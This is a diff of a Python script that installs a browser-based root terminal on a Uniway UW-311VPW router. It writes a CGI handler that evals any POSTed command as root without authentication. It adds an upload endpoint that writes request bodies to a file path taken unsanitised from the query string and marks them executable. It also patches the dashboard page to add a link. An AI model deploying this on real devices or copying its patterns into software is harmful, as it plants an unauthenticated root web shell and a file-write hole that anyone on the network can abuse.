@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-Uniway UW-311VPW Web Terminal Injector
-Injects an interactive web terminal into the router's web interface (http://192.168.1.1/)
-in the bottom-left orange box (<TD width=164 bgColor=#ef8218>).
-Grants full root (UID 0) shell access with arbitrary file modification and command execution.
+Uniway UW-311VPW Dedicated Web Terminal Installer
+Deploys a standalone full-page authentic Linux/Windows style terminal at:
+  http://192.168.1.1/cgi-bin/terminal.cgi
+And adds the button in the bottom-left orange box of the router web management dashboard:
+  http://192.168.1.1/
 """
 
 import sys
@@ -12,33 +13,42 @@ import urllib.request
 import urllib.error
 
 ROUTER_IP = "192.168.1.1"
-PATCH_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sta-device_patched.asp")
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+PATCH_FILE = os.path.join(BASE_DIR, "sta-device_patched.asp")
+TERM_FILE = os.path.join(BASE_DIR, "terminal.asp")
 
-def run_serial_or_exec(cmd):
-    # Try exec.cgi first
+def run_exec(cmd):
     try:
         req = urllib.request.Request(
             f"http://{ROUTER_IP}/cgi-bin/exec.cgi",
             data=cmd.encode('utf-8'),
             headers={'Content-Type': 'text/plain'}
         )
-        with urllib.request.urlopen(req, timeout=4) as resp:
+        with urllib.request.urlopen(req, timeout=5) as resp:
             return resp.read().decode('utf-8', errors='ignore')
     except Exception:
         return None
 
+def upload_file(remote_name, file_path):
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    url = f"http://{ROUTER_IP}/cgi-bin/upload.cgi?{remote_name}"
+    req = urllib.request.Request(
+        url,
+        data=data,
+        headers={'Content-Type': 'application/octet-stream'}
+    )
+    with urllib.request.urlopen(req, timeout=10) as resp:
+        return resp.read().decode('utf-8', errors='ignore').strip()
+
 def main():
     print(f"[*] Targeting router at http://{ROUTER_IP}...")
     
-    if not os.path.exists(PATCH_FILE):
-        print(f"[-] Error: {PATCH_FILE} not found!")
+    if not os.path.exists(PATCH_FILE) or not os.path.exists(TERM_FILE):
+        print("[-] Error: Missing sta-device_patched.asp or terminal.asp")
         sys.exit(1)
 
-    with open(PATCH_FILE, 'rb') as f:
-        patch_data = f.read()
-    print(f"[+] Loaded patched ASP file ({len(patch_data)} bytes)")
-
-    # 1. Setup /tmp/cgi-bin and bind mount if not already done
+    # 1. Setup /tmp/cgi-bin, bind mount, and CGI handlers
     setup_sh = """
 if [ ! -d /tmp/cgi-bin ]; then
     cp -r /boaroot/cgi-bin /tmp/cgi-bin
@@ -52,8 +62,13 @@ echo "Cache-Control: no-cache"
 echo ""
 
 if [ "$REQUEST_METHOD" = "POST" ]; then
+    if [ -n "$HTTP_X_CWD" ] && [ -d "$HTTP_X_CWD" ]; then
+        cd "$HTTP_X_CWD" 2>/dev/null
+    fi
     CMD=$(cat)
     eval "$CMD" 2>&1
+    echo ""
+    echo "___PWD_END___:$(pwd)"
 else
     echo "Ready for commands"
 fi
@@ -64,32 +79,42 @@ cat > /tmp/cgi-bin/upload.cgi << 'EOF'
 #!/bin/sh
 echo "Content-Type: text/plain"
 echo ""
-cat > /tmp/cgi-bin/sta-device.asp
-chmod 755 /tmp/cgi-bin/sta-device.asp
-ls -l /tmp/cgi-bin/sta-device.asp
+
+TARGET="/tmp/cgi-bin/sta-device.asp"
+if [ -n "$QUERY_STRING" ]; then
+    TARGET="/tmp/cgi-bin/$QUERY_STRING"
+fi
+
+cat > "$TARGET"
+chmod 755 "$TARGET"
+ls -l "$TARGET"
 EOF
 chmod 755 /tmp/cgi-bin/upload.cgi
+
+cat > /tmp/cgi-bin/terminal.cgi << 'EOF'
+#!/bin/sh
+echo "Content-Type: text/html; charset=utf-8"
+echo "Cache-Control: no-cache"
+echo ""
+cat /tmp/cgi-bin/terminal.html
+EOF
+chmod 755 /tmp/cgi-bin/terminal.cgi
 """
-    print("[*] Ensuring CGI overlay & endpoints are active...")
-    res = run_serial_or_exec(setup_sh)
-    if res is None:
-        print("[-] Notice: exec.cgi not reachable yet. If router just rebooted, run this via UART or serial console.")
-    else:
-        print("[+] Backend CGI handlers verified.")
+    print("[*] Configuring CGI overlay and backend handlers...")
+    run_exec(setup_sh)
 
-    # 2. Upload patched sta-device.asp
-    print("[*] Uploading sta-device_patched.asp to /boaroot/cgi-bin/sta-device.asp...")
-    req = urllib.request.Request(
-        f"http://{ROUTER_IP}/cgi-bin/upload.cgi",
-        data=patch_data,
-        headers={'Content-Type': 'application/octet-stream'}
-    )
-    with urllib.request.urlopen(req, timeout=10) as resp:
-        out = resp.read().decode('utf-8', errors='ignore')
-        print(f"[+] Server response: {out.strip()}")
+    # 2. Upload files
+    print("[*] Uploading terminal UI...")
+    res1 = upload_file("terminal.html", TERM_FILE)
+    print(f"[+] terminal.html: {res1}")
 
-    print("\n[SUCCESS] Web Terminal successfully injected!")
-    print("Refresh your browser on http://192.168.1.1/ to view the terminal button in the bottom-left orange box.")
+    print("[*] Uploading patched sta-device.asp...")
+    res2 = upload_file("sta-device.asp", PATCH_FILE)
+    print(f"[+] sta-device.asp: {res2}")
+
+    print("\n[SUCCESS] Dedicated Full-Page Terminal is live!")
+    print("Direct Terminal URL:  http://192.168.1.1/cgi-bin/terminal.cgi")
+    print("Router Web Dashboard: http://192.168.1.1/")
 
 if __name__ == "__main__":
     main()
